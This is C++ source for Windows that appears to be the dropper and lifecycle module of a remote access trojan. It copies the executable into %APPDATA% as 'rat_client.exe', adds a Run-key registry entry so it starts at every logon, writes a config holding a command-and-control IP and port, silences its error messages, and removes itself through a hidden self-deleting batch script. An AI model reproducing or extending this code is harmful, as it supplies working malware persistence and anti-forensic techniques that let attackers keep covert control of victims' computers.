#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <cstdlib>
#include <system_error>
#include <unordered_map>


std::filesystem::path getAppDataPath() {
    const char* appdata = std::getenv("APPDATA");
    if (!appdata) {
        // std::cerr << "Error: APPDATA no encontrada.\n";
        return {};
    }
    return std::filesystem::path(appdata);
}

bool fileExist(const std::filesystem::path& file_path) {
    std::error_code ec;
    return std::filesystem::exists(file_path, ec) && std::filesystem::is_regular_file(file_path, ec);
}

bool directoryExist(const std::filesystem::path& dir_path) {
    try {
        return std::filesystem::exists(dir_path) &&std::filesystem::is_directory(dir_path);
    } catch(const std::exception& ex) {
        //std::cerr << ex.what() << '\n';
        return false;
    }
}

// Delete directory or file (if it's directory → recursive)
bool deletePath(const std::filesystem::path& target) {
    std::error_code ec;
    if (std::filesystem::is_directory(target)) {
        // Delete directory and his content
        std::filesystem::remove_all(target, ec);
        if (ec) {
            //std::cerr << "Error deleting directory" << ec.message() << "\n";
            return false;
        }

    } else {
        // Delete file
        if (std::filesystem::remove(target, ec) || ec) {
            //std::cerr << "Error deleting the file" << ec.message() << "\n";
            return false;
        }
    }
    return true;
}

std::filesystem::path getExecutablePath() {
    char buffer[MAX_PATH] = {0};
    DWORD size = GetModuleFileNameA(nullptr, buffer, MAX_PATH);
    if (size == 0) {
        // Error, return empty path
        return {};
    }
    return std::filesystem::path(buffer);
}

bool persistence(const std::wstring& valueName, const std::wstring& path) {
    // Function to apply persistence
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // Create or Open HKCU/Run Key
    if (RegOpenKeyExW (HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
            return false;
    }

    LONG rc = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
        reinterpret_cast<const BYTE*>(path.c_str()),
        static_cast<DWORD>((path.size() + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);
    return (rc == ERROR_SUCCESS);
}


bool deletePersistence(const std::wstring& valueName) {
    // Function to delete persistence
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey = NULL;

    // open HKCU Key with write permissions
    REGSAM sam = KEY_READ | KEY_WRITE;
    LONG rc = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, sam, &hKey);

    if (rc != ERROR_SUCCESS) {
        // do not print output
        return false;
    }

    // Delete value
    rc = RegDeleteValueW(hKey, valueName.c_str());

    if (rc == ERROR_SUCCESS) {
        std::wcout << L"Value deleted: " << valueName.c_str() << L"\n";
    } else if (rc == ERROR_FILE_NOT_FOUND) {
        std::wcout << L"Value does not exist: " << valueName.c_str() << L"\n";
    } else {
        std::wcout << L"RegDeleteValueW falló: " << rc << L"\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}


bool checkPersistence(const std::wstring& valueName) {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    LONG rc = RegQueryValueExW(hKey, valueName.c_str(), nullptr, nullptr, nullptr, nullptr);
    RegCloseKey(hKey);

    return (rc == ERROR_SUCCESS);
}

//Copiar ejecutable en %APPDATA%
bool copyExe(const std::filesystem::path& sourceFile, const std::filesystem::path& destFolder) {
    try {
        // Create parent directories if does not exist
        std::error_code ec;
        if (!std::filesystem::exists(destFolder)) {
            if (!std::filesystem::create_directories(destFolder, ec)) {
                std::cerr << "No se pudo crear la carpeta destino: " << ec.message() << "\n";
                return false;
            }
        }

        // build destination file path
        std::filesystem::path destFile = destFolder / "rat_client.exe";

        // Copy file
        std::filesystem::copy_file(sourceFile, destFile, std::filesystem::copy_options::overwrite_existing, ec);
        if (ec) {
            std::cerr << "Error al copiar el archivo: " << ec.message() << "\n";
            return false;
        }

        return true;
    } catch (const std::exception& ex) {
        std::cerr << "Excepcion al copiar el archivo: " << ex.what() << "\n";
        return false;

    }

}

bool createConfigFile(const std::filesystem::path& file_path) {
    try {
        std::string defaultContent =
            "Defaul configuration for rat_client.exe\n"
            "ip_address=127.0.0.1\n"
            "port=8888\n";

        // Create parent directories if does not exist
        if (file_path.has_parent_path()) {
            std::filesystem::path parent = file_path.parent_path();
            std::error_code ec;
            std::filesystem::create_directories(parent, ec);
            if (ec) {
                //std::cerr << "Could not create parent directories: " << ec.message() << std::endl;
                return false;
            }
        }

        // temporal path
        std::filesystem::path tmp = file_path;
        tmp += ".tmp";

        // Write in temporal path
        {
            std::ofstream ofs(tmp, std::ios::binary | std::ios::trunc);
            if (!ofs) {
                //std::cerr << "Error: Could not open temporal file to write: " << tmp << "\n";
                return false;
            }
            ofs << defaultContent;
            ofs.flush();

            if (!ofs) {
                //std::cerr << "Error: Could not write in temporal file: " << tmp << "\n";
                std::error_code ec;
                std::filesystem::remove(tmp, ec);
                return false;
            }
        }

        // Rename (move) tmp -> dest
        std::error_code ec;
        std::filesystem::rename(tmp, file_path, ec);
        if (ec) {
            std::filesystem::copy_file(tmp, file_path, std::filesystem::copy_options::overwrite_existing, ec);
            if (ec) {
                //std::cerr << "Could not move temporal file to dest: " << ec.message() << "\n";
                std::filesystem::remove(tmp, ec);
                return false;
            }
            std::filesystem::remove(tmp, ec);
        }
        return fileExist(file_path);

    } catch (const std::exception& ex) {
        //std::cerr << "Exception: createConfigFile: " << ex.what() << "\n";
        return false;
    }
}

std::unordered_map<std::string, std::string> loadConfig(const std::filesystem::path& file_path) {
    std::unordered_map<std::string, std::string> config;
    std::ifstream ifs(file_path);
    if (!ifs) {
        //std::cerr << "Could not open the configuaration file: " << file_path << "\n";
        return config;
    }

    std::string line;
    while (std::getline(ifs, line)) {
        // Ignore empty lines or coments that starts with ';'
        if (line.empty() || line[0] == ';')
            continue;

        size_t pos = line.find('=');
        if (pos == std::string::npos) continue; // there is no '=' → invalid line

        std::string key = line.substr(0, pos);
        std::string value = line.substr(pos + 1);

        // Delete blank spaces
        key.erase(0, key.find_first_not_of(" \t"));
        key.erase(key.find_last_not_of(" \t") + 1);
        value.erase(0, value.find_first_not_of(" \t"));
        value.erase(value.find_last_not_of(" \t") + 1);

        config[key] = value;
    }

    return config;
}

void goodBye() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    std::string batPath = std::string(tempPath) + "del_" + std::to_string(GetTickCount()) + ".bat";

    std::ofstream bat(batPath);
    bat << ":Repeat\n";
    bat << "del \"" << exePath << "\"\n";
    bat << "if exist \"" << exePath << "\" goto Repeat\n";
    bat << "del \"%~f0\"\n"; // Delete batch
    bat.close();

    // Execute hidden batch 
    ShellExecuteA(nullptr, "open", batPath.c_str(), nullptr, nullptr, SW_HIDE);
}